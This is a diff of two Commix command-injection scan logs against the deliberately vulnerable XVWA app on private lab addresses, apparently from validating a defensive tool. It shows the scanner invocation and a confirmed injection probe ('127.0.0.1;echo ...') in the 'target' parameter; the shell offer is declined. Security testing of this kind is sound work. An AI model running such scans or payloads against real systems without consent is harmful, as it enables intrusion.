@@ -1,4 +1,4 @@
-=== Commix | xvwa/no_waf | http://172.23.0.10:80/xvwa/vulnerabilities/cmdi/?target=127.0.0.1 | 15/07/2026  8:22:20,72 ===
+=== Commix | xvwa/no_waf | http://172.18.0.3:80/xvwa/vulnerabilities/cmdi/?target=127.0.0.1 | 17/07/2026 20:39:30,26 ===
 CMD: echo <url> | commix.py  --batch --user-agent="DoBotShield-TCC-Validation/1.0" --level=3 --skip-empty --skip-waf --delay=1 --timeout=20 --retries=2  --output-dir=/work
 ----------------------------------------------------------------
                                       __
@@ -15,25 +15,25 @@ Copyright © 2014-2026 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
 
 ([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
 [0m
-[[94m11:22:22[0m] [0m[[32minfo[0m] Using 'stdin' for parsing targets list.[0m
-[1m[1/1] URL - GET http://172.23.0.10:80/xvwa/vulnerabilities/cmdi/?target=127.0.0.1[0m
+[[94m23:39:33[0m] [0m[[32minfo[0m] Using 'stdin' for parsing targets list.[0m
+[1m[1/1] URL - GET http://172.18.0.3:80/xvwa/vulnerabilities/cmdi/?target=127.0.0.1[0m
 [1mDo you want to use URL #1 for testing? [Y/n] > Y[0m
-[[94m11:22:22[0m] [0m[[32minfo[0m] Testing URL 'http://172.23.0.10:80/xvwa/vulnerabilities/cmdi/?target=127.0.0.1'.[0m
-[[94m11:22:22[0m] [[32m[1minfo[0m] [1mTesting connection to the target URL. [0m
-[1mYou have not declared any cookie(s), but the server wants to set its own ('PHPSESSID=4f117aa76ae...c5ddf4eb9f'). Do you want to use those? [Y/n] > Y[0m
-[[94m11:22:31[0m] [0m[[32minfo[0m] Using output directory '/work'.[0m
-[[94m11:22:31[0m] [0m[[32minfo[0m] Performing heuristic (passive) tests on the target URL.[0m
-[[94m11:22:42[0m] [[93mwarning[0m] Target's estimated response time is 2 seconds. That may cause delays during the data extraction procedure.[0m
-[[94m11:22:42[0m] [0m[[32minfo[0m] Setting GET parameter 'target' for tests.[0m
-[[94m11:22:42[0m] [0m[[32minfo[0m] Performing heuristic (basic) tests to the GET parameter 'target'.[0m
-[[94m11:22:49[0m] [[32m[1minfo[0m] [1mHeuristic (basic) tests show that GET parameter 'target' might be injectable (possible OS: 'Unix-like').[0m
-[[94m11:22:56[0m] [0m[[32minfo[0m] Testing the (results-based) classic command injection technique.[32m          [0m[0m 
-[[94m11:22:56[0m] [[32m[1minfo[0m] [1mGET parameter 'target' appears to be injectable via (results-based) classic command injection technique.[0m
-           [90m|_ [0m127.0.0.1;echo FCQMDU$((59+36))$(echo FCQMDU)FCQMDU[0m
+[[94m23:39:33[0m] [0m[[32minfo[0m] Testing URL 'http://172.18.0.3:80/xvwa/vulnerabilities/cmdi/?target=127.0.0.1'.[0m
+[[94m23:39:33[0m] [[32m[1minfo[0m] [1mTesting connection to the target URL. [0m
+[1mYou have not declared any cookie(s), but the server wants to set its own ('PHPSESSID=ddef0af102c...7885683bd3'). Do you want to use those? [Y/n] > Y[0m
+[[94m23:39:42[0m] [0m[[32minfo[0m] Using output directory '/work'.[0m
+[[94m23:39:42[0m] [0m[[32minfo[0m] Performing heuristic (passive) tests on the target URL.[0m
+[[94m23:39:53[0m] [[93mwarning[0m] Target's estimated response time is 2 seconds. That may cause delays during the data extraction procedure.[0m
+[[94m23:39:53[0m] [0m[[32minfo[0m] Setting GET parameter 'target' for tests.[0m
+[[94m23:39:53[0m] [0m[[32minfo[0m] Performing heuristic (basic) tests to the GET parameter 'target'.[0m
+[[94m23:40:00[0m] [[32m[1minfo[0m] [1mHeuristic (basic) tests show that GET parameter 'target' might be injectable (possible OS: 'Unix-like').[0m
+[[94m23:40:08[0m] [0m[[32minfo[0m] Testing the (results-based) classic command injection technique.[32m          [0m[0m 
+[[94m23:40:08[0m] [[32m[1minfo[0m] [1mGET parameter 'target' appears to be injectable via (results-based) classic command injection technique.[0m
+           [90m|_ [0m127.0.0.1;echo IZHTDH$((49+81))$(echo IZHTDH)IZHTDH[0m
 [1mGET parameter 'target' is likely vulnerable. Do you want to spawn a pseudo-terminal shell? [Y/n] > n[0m
 [1mDo you want to continue testing using the classic command injection technique? [y/N] > N[0m
 [1mDo you want to skip further testing on the GET parameter 'target'? (recommended if certain) [Y/n] > Y[0m
 [1mDo you want to keep testing the others? [y/N] > N[0m
-[[94m11:22:56[0m] [0m[[32minfo[0m] Fetched data logged to text files under '/work/172.23.0.10_80/logs.txt'.[0m
+[[94m23:40:08[0m] [0m[[32minfo[0m] Fetched data logged to text files under '/work/172.18.0.3_80/logs.txt'.[0m
 
 TOOL_RC=0
